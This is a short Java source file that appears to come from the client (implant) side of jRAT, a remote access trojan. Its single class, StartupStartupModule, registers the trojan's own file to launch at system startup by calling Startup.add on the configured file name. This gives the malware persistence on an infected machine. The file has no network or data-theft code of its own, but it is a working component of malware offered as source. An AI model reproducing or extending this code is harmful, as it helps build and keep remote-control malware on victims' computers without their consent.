package jrat.client.modules.startup;

import jrat.client.Configuration;
import startuplib.Startup;

import java.util.Map;

public class StartupStartupModule extends StartupModule {
	
	public StartupStartupModule(Map<String, String> config) {
		super(config);
	}
	
	public void run() throws Exception {
		try {
			Startup.add(Configuration.getFileName());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
